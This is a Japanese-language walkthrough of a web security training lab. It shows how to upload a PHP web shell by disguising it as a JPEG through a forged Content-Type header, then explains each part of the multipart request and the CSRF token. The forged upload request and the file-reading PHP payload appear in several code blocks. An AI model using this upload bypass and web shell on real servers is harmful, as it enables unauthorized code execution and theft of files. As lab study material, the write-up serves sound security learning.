## Lab: Web shell upload via Content-Type restriction bypass
	

## やったこと

### Step 1: ログイン & 画像アップロード
- `wiener:peter` でログイン
- アカウントページで**適当な画像**をアバターとしてアップロード

### Step 2: Burpでリクエストをキャッチ
- **Proxy > HTTP history** を開く
- フィルターの **Hide のチェックを外す**（jpg/pngが隠れてるから）
- 以下の2つを **Repeaterに送信**：
  - `POST /my-account/avatar`
  - `GET /files/avatars/画像ファイル名`

### Step 3: POSTリクエストを改ざん
Repeaterで2箇所変更：

```
filename="exploit.php"          ← ファイル名をPHPに
Content-Type: image/jpeg        ← JPEGに偽装（ここが核心！）

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

→ **Send** → `The file avatars/exploit.php has been uploaded.` を確認

### Step 4: PHPシェルを実行
GETのRepeaterタブでファイル名を変更：

```
GET /files/avatars/exploit.php
```

→ **Send** → レスポンスにシークレット文字列が表示

### Step 5: 答えを提出
ラボの **Submit solution** にシークレットを入力 → Solved！

---

## この脆弱性のポイント

サーバーは `Content-Type` ヘッダー**だけ**を見てファイルを検証していた。  
ユーザーが自由に書き換えられるヘッダーを信頼するのが問題 → ファイルの**実際の中身**で検証すべき。
	

---

## まず Step 1 から

普通の画像をアップロードしたときに飛んだリクエストがこれ：

```
POST /my-account/avatar HTTP/2
Host: 0aae009904fa90cb80798abb008000d5.web-security-academy.net
Cookie: session=wH8NtaEb6n4FPq1eockkkRGzsuIDZatm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVYEXw5CCOCKSt8GY
```



- `POST` の意味
- `Host` の意味
- `Cookie` の意味
- `Content-Type: multipart/form-data` の意味
- `boundary` って何？


---

## まず `POST` とは？

ブラウザがサーバーに「データを送るよ」っていう合図。

HTTPのリクエストには種類があって：

```
GET  → 「データをちょうだい」（ページを見るとき）
POST → 「データを送るよ」（フォーム送信、ファイルアップロードのとき）
```

今回はファイルをアップロードしてるから `POST` が使われてる。

---

## `Host` って何？

```
Host: 0aae009904fa90cb80798abb008000d5.web-security-academy.net
```

「どのサーバーに送るか」のあて先。

手紙でいう**宛名**みたいなもの。

---

 ## ‘Content-Type` って何？

`Content-Type` は「送るデータの種類」を伝えるもの。

今回は `multipart/form-data` → **「複数のデータをまとめて送るよ」** という意味。

ファイルアップロードのときは：
- ファイルの中身
- ユーザー名
- CSRFトークン

みたいに**複数のデータを一緒に送る**から `multipart` が使われる。

---

## `boundary` って何？

```
boundary=----WebKitFormBoundaryVYEXw5CCOCKSt8GY
```

複数のデータをまとめて送るとき、**データとデータの区切り線**として使われる文字列。

実際のリクエスト本文を見るとわかりやすい：

```
------WebKitFormBoundaryVYEXw5CCOCKSt8GY   ← 区切り線
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryVYEXw5CCOCKSt8GY   ← 区切り線
Content-Disposition: form-data; name="user"

wiener

------WebKitFormBoundaryVYEXw5CCOCKSt8GY-- ← 終わりの区切り線
```

サーバーはこの区切り線を見て「ここからここまでがファイル、ここからここまでがユーザー名」って判断してる。

---

イメージ的には**お弁当箱の仕切り**みたいなもの！

次はリクエスト本文の中身を一個ずつ見ていく？
					## リクエスト本文の最初のブロック

```
------WebKitFormBoundaryVYEXw5CCOCKSt8GY
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

## `Content-Disposition` って何？

「このデータは何ですか？」っていう説明。

```
name="avatar"        ← フォームの項目名（アバター欄のデータだよ）
filename="exploit.php" ← ファイルの名前
```

---

## `Content-Type: image/jpeg` って何？

「このファイルの種類はJPEG画像です」っていう宣言。

**ここが今回の攻撃の核心！**

```
実際のファイルの中身 → PHPコード（画像じゃない）
Content-Typeの宣言  → image/jpeg（嘘！）
```

サーバーはファイルの中身を確認せず、この宣言だけ信じてしまった。

---

## `<?php echo file_get_contents('/home/carlos/secret'); ?>` って何？

これが実際に送り込んだPHPコード。

```
file_get_contents('/home/carlos/secret')
→ /home/carlos/secret というファイルを開いて中身を読む

echo
→ 読んだ中身を画面に表示する
```

つまり「carlosのシークレットファイルを開いて表示して」っていう命令。

---


## 2つ目のブロック

```
------WebKitFormBoundaryVYEXw5CCOCKSt8GY
Content-Disposition: form-data; name="user"

wiener
```

---

## `name="user"` って何？

「このデータはユーザー名です」っていう説明。

値は `wiener` → 今ログインしてるアカウント名。

サーバーは「どのアカウントのアバターを更新するか」を判断するために使ってる。

---

## 3つ目のブロック

```
------WebKitFormBoundaryVYEXw5CCOCKSt8GY
Content-Disposition: form-data; name="csrf"

VyWpKiddeBzoskoOS9RjnfGq9p3VHWFE
```

---

## `csrf` って何？

**CSRF（クロスサイトリクエストフォージェリ）対策のトークン。**

悪意のあるサイトが「wienerのアバターを勝手に変更するリクエスト」を送ってくる攻撃を防ぐためのもの。

仕組みはこう：

```
サーバー →「このランダムな文字列も一緒に送ってね」→ ブラウザ
ブラウザ → フォーム送信のときに一緒に送り返す
サーバー → 「知ってる文字列だからOK」と判断
```

悪意のあるサイトはこのトークンを知らないから、リクエストを偽造できない。

---

## ブロック全体のまとめ

```
ブロック1 → ファイル本体（PHPコードをJPEGと偽って送った）
ブロック2 → ユーザー名（wiener）
ブロック3 → CSRFトークン（正規のリクエストだよという証明）
```

---

